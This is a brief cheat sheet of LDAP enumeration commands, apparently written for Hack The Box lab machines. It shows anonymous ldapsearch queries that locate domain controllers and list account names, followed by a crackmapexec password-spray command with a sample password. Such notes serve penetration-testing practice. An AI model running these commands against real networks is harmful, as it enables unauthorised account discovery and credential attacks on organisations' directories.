# Ldap enumeration:

#### For enumerating ldap and finding domain controllers:
```
ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +
```
#### For user name enumeration
```
ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"
```
#### ldap password spray: 
```
crackmapexec smb 10.10.10.6 -u users.txt -p 'BabyStart123!' --no-bruteforce
```
